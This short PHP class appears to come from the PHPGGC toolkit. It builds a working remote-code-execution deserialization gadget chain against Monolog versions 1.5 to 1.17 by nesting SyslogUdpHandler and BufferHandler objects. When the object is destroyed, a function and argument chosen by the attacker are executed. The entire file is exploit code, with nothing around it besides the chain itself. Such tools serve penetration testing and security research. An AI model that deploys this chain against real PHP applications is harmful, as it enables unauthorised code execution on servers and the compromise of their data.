<?php

namespace GadgetChain\Monolog;

class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.5 <= 1.17';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', $function],
                [$parameter, 'level' => null]
            )
        );
    }
}